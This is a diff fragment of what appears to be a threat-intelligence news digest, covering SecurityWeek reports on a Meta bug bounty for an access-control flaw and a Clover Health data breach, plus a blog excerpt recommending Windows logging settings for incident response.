technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap Ju
+A security researcher says he has received a significant bug bounty from Meta after discovering a critical vulnerability that exposed customer support data. The vulnerability was discovered and reported to Meta in January 2026 by independent researcher Rony K Roy. The initial report to the social media giant described a security hole of limited severity, but further analysis revealed that the flaw’s impact was much higher than initially believed. According to Roy, Meta rolled out patches in April and had not found any evidence of malicious exploitation. The researcher disclosed his findings last week and told SecurityWeek that he received a $78,000 bug bounty from Meta. Meta has not responded to SecurityWeek’s request to confirm Roy’s claims, but he is indeed listed as one of the top researchers on the company’s bug bounty leaderboard for 2026. Roy initially believed he had identified an authorization issue in Meta Horizon Managed Solutions, an enterprise platform for managing Meta Quest devices and users. It turned out to be a broader issue affecting Meta’s backend support infrastructure. Advertisement. Scroll to continue reading. The researcher’s analysis led to the discovery of a vulnerability involving missing authorization, broken access control, and insecure direct object reference (IDOR) issues. When chained, these flaws could have been exploited to enumerate Meta support case numbers and obtain support requests. According to Roy, an attacker could have exploited the vulnerability to obtain email and chat conversations between users and Meta support, support case details, files submitted to the company via support requests, and personal and contact information shared by users with Meta support. In addition, an attacker could have created support requests on behalf of organizations that use Meta Horizon Managed Solutions, modified support workflows (including changing case status), and added unauthorized subscribers to support cases. Related : Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Related : Zimbra Update Patches Critical Vulnerabilities Related : OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs SonicWall Zero-Days Exploited to Deliver Custom Malware for Weeks Before Patch New Index Tracks Material Breaches — And Refuses to Add Up the Losses WP2Shell WordPress Vulnerabilities Exploited in the Wild Two Scattered Spider Hackers Sentenced to Jail in UK ‘ClickLock Stealer’ Bypasses macOS Security With Social Engineering, Process Killing China’s Top Cybersecurity Firms Hit by Mounting Military Procurement Bans Trend Micro, Tanium, ESET and Tenable Patch Severe Product Vulnerabilities US Charges Russian Individuals and Firms for Running Cybercrime Services Latest News Cisco Launches Low-Cost AI Models for Source Code Security Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Clover Health Investments Discloses Data Breach Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploit
 ```
 
 #### Corroborating sources (1)
@@ -3085,7 +3114,7 @@ A security researcher says he has received a significant bug bounty from Meta af
 #### Cluster taxonomy (union across members)
 - threat_categories: data_breach, phishing_social_eng, ransomware_extortion, zero_day
 - affected_industries: financial_services, government, healthcare, manufacturing_industrial
-- affected_products: Microsoft 365, Microsoft SharePoint
+- affected_products: Microsoft 365
 - urgency_signals: zero_day
 - content_type: incident_report
 - confidence_tier: tier_4_news
@@ -3093,7 +3122,7 @@ A security researcher says he has received a significant bug bounty from Meta af
 #### Primary article taxonomy
 - threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach
 - affected_industries: healthcare, financial_services, government, manufacturing_industrial
-- affected_products: Microsoft SharePoint, Microsoft 365
+- affected_products: Microsoft 365
 - urgency_signals: zero_day
 - content_type: incident_report
 - confidence_tier: tier_4_news
@@ -3107,7 +3136,7 @@ Using social engineering, hackers compromised employee accounts with access to p
 #### Full body
 
 ```
-Healthcare technology company Clover Health Investments has disclosed a data breach impacting customers’ personal and health information. Discovered on July 4, the incident was the result of a social engineering attack that compromised three non-managerial health plan employee accounts. Clover Health Investments says it activated its response plan immediately after discovering the attack, and engaged third-party cybersecurity experts to contain and investigate the intrusion. [ Read: New Index Tracks Material Breaches — And Refuses to Add Up the Losses ] The compromised accounts “were assigned to employees who had member visit-scheduling and broker-facing sales functions,” the company says in a filing with the US Securities and Exchange Commission (SEC). “The employee accounts had access to certain personally identifiable information and protected health information, but had no access to corporate financial or claims systems,” it said. Advertisement. Scroll to continue reading. Clover Health Investments believes that it contained the incident and evicted the attackers from its systems, but has yet to determine the precise nature, scope, and extent of the data breach. The company has not shared details on the threat actor behind the attack, and no known ransomware or extortion group has claimed responsibility for the incident. SecurityWeek has emailed Clover Health Investments for additional information on the data breach and will update this article if the company responds. Founded in 2014, Clover Health Investments provides Medicare Advantage insurance plans and is a direct US government contractor. Related: Ernst & Young Data Breach Affects Personal, Financial Information Related: Hugging Face Hacked in Autonomous AI Attack Related: Podcast: Broken Governance, Agentic AI, and the MindStone Agent Exclusive Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Ernst & Young Data Breach Affects Personal, Financial Information Hugging Face Hacked in Autonomous AI Attack Chrome 150 Update Patches Severe Memory Safety Bugs Beacon Security Raises $13 Million for Security Data Platform Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei Risk Ledger Raises $32 Million in Series B Funding Fresh SharePoint Vulnerability Exploited Soon After Disclosure Latest News Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Zimbra Update Patches Critical Vulnerabilities Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is outpacing remediation, where risk is growing fastest, and what security leaders can do to close the gap before attackers take advantage. Register Virtual Event: CodeSecCon 2026 August 19, 2026 CodeSecCon bridges the gap between dev and security. Discover best practices for secure coding, innovative risk-reduction tools, and safe AI integration to cultivate a true DevSecOps culture. Safely secure your apps! Register People on the Move Jazz has named Sean Robinson, Rickie Goyal, Danielle Guetta, Shani Nago, and Lior Magram as VPs and Michael Calev as COO. AJ Shipley has
+Healthcare technology company Clover Health Investments has disclosed a data breach impacting customers’ personal and health information. Discovered on July 4, the incident was the result of a social engineering attack that compromised three non-managerial health plan employee accounts. Clover Health Investments says it activated its response plan immediately after discovering the attack, and engaged third-party cybersecurity experts to contain and investigate the intrusion. [ Read: New Index Tracks Material Breaches — And Refuses to Add Up the Losses ] The compromised accounts “were assigned to employees who had member visit-scheduling and broker-facing sales functions,” the company says in a filing with the US Securities and Exchange Commission (SEC). “The employee accounts had access to certain personally identifiable information and protected health information, but had no access to corporate financial or claims systems,” it said. Advertisement. Scroll to continue reading. Clover Health Investments believes that it contained the incident and evicted the attackers from its systems, but has yet to determine the precise nature, scope, and extent of the data breach. The company has not shared details on the threat actor behind the attack, and no known ransomware or extortion group has claimed responsibility for the incident. SecurityWeek has emailed Clover Health Investments for additional information on the data breach and will update this article if the company responds. Founded in 2014, Clover Health Investments provides Medicare Advantage insurance plans and is a direct US government contractor. Related: Ernst & Young Data Breach Affects Personal, Financial Information Related: Hugging Face Hacked in Autonomous AI Attack Related: Podcast: Broken Governance, Agentic AI, and the MindStone Agent Exclusive Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Zimbra Update Patches Critical Vulnerabilities OpenSSL Silently Fixes ‘HollowByte’ DoS Vulnerability Ernst & Young Data Breach Affects Personal, Financial Information Hugging Face Hacked in Autonomous AI Attack Chrome 150 Update Patches Severe Memory Safety Bugs Beacon Security Raises $13 Million for Security Data Platform Cyberattack Disrupts Operations of Japanese Frozen Food Giant Nichirei Risk Ledger Raises $32 Million in Series B Funding Latest News Cisco Launches Low-Cost AI Models for Source Code Security Empirical Security Raises $25 Million in Series A Funding SecurityWeek Launches Critical Impact Awards to Recognize Excellence in Industrial Cybersecurity New HollowGraph Malware Abuses Microsoft 365 Calendar for C&C Communication CISO Conversations: Andreas Gaetje – From Economics to CISO at Körber AG Estée Lauder Discloses Impact From Oracle EBS Zero-Day Hack Meta Paid $78,000 Bounty for Vulnerability Exposing Customer Support Data Exploitation of ServiceNow Vulnerability Seen Days After Disclosure Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Closing the Exploitation Gap July 22, 2026 Join this live webinar as we explore why exploitation is outpacing remediation, where risk is growing fastest, and what security leaders can do to close the gap before attackers take advantage. Register Virtual Event: CodeSecCon 2026 August 19, 2026 CodeSecCon bridges the gap between dev and security. Discover best practices for secure coding, innovative risk-reduction tools, and safe AI integration to cultivate a true DevSecOps culture. Safely secure your apps! Register People on the Move Jazz has named Sean Robinson, Rickie Goyal, Danielle Guetta, Shani Nago, and Lior Magram as VPs and Michael Calev as COO. AJ Shipley has been
 ```
 
 #### Corroborating sources (1)
@@ -3626,18 +3655,16 @@ Estée Lauder discloses data breach via Oracle E-Business flaw By Bill Toulas Ju
 - Source: Team Cymru (ransomware_ecrime_financial_crime)
 - Published: 2026-07-21T13:55:45+00:00
 - Link: https://www.team-cymru.com/post/modernizing-incident-response-4-steps-to-bulletproof-your-windows-logging
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_industries: government
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- affected_industries: government
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3645,12 +3672,6 @@ Estée Lauder discloses data breach via Oracle E-Business flaw By Bill Toulas Ju
 
 ```
 Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR.
-```
-
-#### Full body
-
-```
-All Blog Internet Weather Threat Research Threat Intelligence 101 Abigail Lorion 2 min read July 14, 2026 Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging In the latest episode of the Future of Threat Intelligence podcast, host Eli Woodward is joined by Andrew Rathbun, Senior Consultant at Palo Alto Networks’ Unit 42, to analyze the hidden liabilities within default enterprise logging architectures. For investigators tracking sophisticated network intrusions, native operating system settings frequently serve as an unintentional bottleneck to successful timeline reconstruction. Andrew’s deep knowledge of Windows logging, combined with his passion for incident response, provides a rare and deep view into Windows logging few in the industry can match. These insights are obtained and developed through years of practical IR knowledge and seeing what works and what does not. ‍ Windows systems routinely process security telemetry through what Rathbun identifies as a "conveyor belt of volatility". Every second, Rathbun notes, logs are deleted to make space for new entries. This is largely a relic of 2002 disk size constraints and remains a default in Windows systems – critical security event logs continuously overwrite themselves to accommodate live network data. High-consequence forensic primitives including Event ID 4624 successful authentications and Event ID 4625 authentication failures rapidly cycle off the back end of the server. When a digital forensics firm arrives to investigate an active breach, the historical logging record required to spot brute-force indicators has often vanished entirely. ‍ Four Tactic Framework to Expand Retention ‍ Countering this automated data loss requires system administrators to aggressively harden the native operating system environment before an attack occurs. Responders cannot protect an infrastructure if the evidence of initial access is unrecoverable. Here is the breakdown of Rathbun’s specific recommendations: - Increase the Default Log Size : Substantially increase the Security log from its default 32 MB up to 1 GB. This expands the "bucket" to hold months of data, which is highly feasible and low-cost given modern storage availability. - Install and Update Sysmon : Deploy Sysmon to log detailed process activity, capturing threat actor tactics like time-stomping and process hollowing. While scheduled for inclusion in Windows 11 updates, it still requires manual updates; sysadmins must actively maintain it to avoid missing new capabilities or bug fixes. - Enable Volume Shadow Copies : Maintain these copies as an essential defense to mitigate log-clearing attempts and provide forensic investigators with a historical view of file system artifacts. - Ensure the USN Journal ($J) Exists and is Sized Correctly : Verify the existence of the USN Journal to act as a file system ledger that records all file creations, deletions, renames, and size changes. Ensure it is sized sufficiently large to prevent critical forensic data from being overwritten too quickly. ‍ Deploying Al as a Scripting Engine ‍ Within modern Digital Forensics and Incident Response (DFIR) workflows, artificial intelligence serves as a highly effective force multiplier for manual tasks, provided it is governed by strict technical boundaries. Teams must avoid treating large language models as authoritative sources of forensic truth. Practitioners successfully utilize generative AI models to compress data-gathering windows, interpret unfamiliar technology stacks, and validate complex, suspicious command-line strings. For example, investigators routinely use automated scripts to instantly translate Linux audit log epoch timestamps into human-readable time zones during cross-platform incident reviews. While deploying these automated engines allows smaller analytical teams to rapidly prototype tools and navigate dense datasets without constantly exhausting internal subject matter experts, human verification rem
 ```
 
 #### Corroborating sources (1)
